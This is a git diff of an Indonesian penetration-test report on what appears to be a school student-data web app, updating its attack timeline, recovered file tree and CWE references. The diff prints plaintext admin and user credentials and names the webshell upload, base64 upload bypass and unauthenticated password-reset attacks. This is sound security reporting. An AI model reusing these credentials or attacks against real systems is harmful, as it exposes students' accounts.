 | 22 Sep 2026 | Login admin + testing vektor lain                                      |
 | 22 Sep 2026 | Session hijacking test (Wireshark)                                     |
 | 22 Sep 2026 | Testing upload webshell (gagal — whitelist ketat)                      |
-| 22 Sep 2026 | Upload bypass via base64 (`LaporanV2/file_bypass.py`)                  |
-| 22 Sep 2026 | Identifikasi kredensial siswa default = NISN                           |
-| 22 Sep 2026 | Konfirmasi file `.sql` masih ada di commit history                     |
-| 22 Sep 2026 | Konfirmasi credential `admin:kalinadmin08` & `user:user123`            |
-| 23 Sep 2026 | Patch v1.1: CSRF, validasi base64, MIME, GPS, nama file random         |
-| 23 Sep 2026 | Patch v1.2: liveness nonce, rate limit, re-encode GD, logging          |
-| 23 Sep 2026 | Verifikasi patch dengan `file_bypass.py` (sebagian besar ditolak)      |
+| 29 Sep 2026 | Upload bypass via base64 (`LaporanV2/file_bypass.py`)                  |
+| 29 Sep 2026 | Identifikasi kredensial siswa default = NISN                           |
+| 29 Sep 2026 | Konfirmasi file `.sql` masih ada di commit history                     |
+| 29 Sep 2026 | Konfirmasi credential `admin:kalinadmin08` & `user:user123`            |
+| 29 Sep 2026 | **Penemuan endpoint `reset_password.php` (temuan 4.9)**                |
+| 29 Sep 2026 | **Konfirmasi PoC: 21 akun siswa ter-reset via `curl`**                 |
 
 ### D. Struktur File yang Ter-recover
 
@@ -1135,6 +1438,7 @@ hasil-git/
 ├── kelas_edit.php / kelas_hapus.php / kelas_list.php / kelas_tambah.php
 ├── laporan.php
 ├── login.php / logout.php
+├── reset_password.php             ← BACKDOOR (temuan 4.9)
 ├── siswa_detail.php / siswa_edit.php / siswa_hapus.php / siswa_list.php / siswa_tambah.php
 ├── uploads/
 └── views/
@@ -1146,14 +1450,16 @@ hasil-git/
 
 - OWASP Top 10 2021: A01 (Broken Access Control), A02 (Cryptographic Failures), A04 (Insecure Design), A05 (Security Misconfiguration), A07 (Identification and Authentication Failures)
 - OWASP File Upload Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
-- CWE-538: File and Directory Information Exposure
-- CWE-798: Use of Hard-coded Credentials
-- CWE-548: Exposure of Information Through Directory Listing
-- CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
+- CWE-306: Missing Authentication for Critical Function
+- CWE-352: Cross-Site Request Forgery (CSRF)
 - CWE-434: Unrestricted Upload of File with Dangerous Type
 - CWE-521: Weak Password Requirements
+- CWE-538: File and Directory Information Exposure
+- CWE-548: Exposure of Information Through Directory Listing
+- CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
+- CWE-620: Unverified Password Change
+- CWE-798: Use of Hard-coded Credentials
 - CWE-262: Not Using Password Aging
-- CWE-352: Cross-Site Request Forgery (CSRF)
 - NIST SP 800-63B: Digital Identity Guidelines (Authentication)
 - PHP Manual: [`finfo_buffer`](https://www.php.net/manual/en/function.finfo-buffer.php), [`getimagesizefromstring`](https://www.php.net/manual/en/function.getimagesizefromstring.php), [`base64_decode`](https://www.php.net/manual/en/function.base64-decode.php)
 - GitHub Docs: Removing sensitive data from a repository
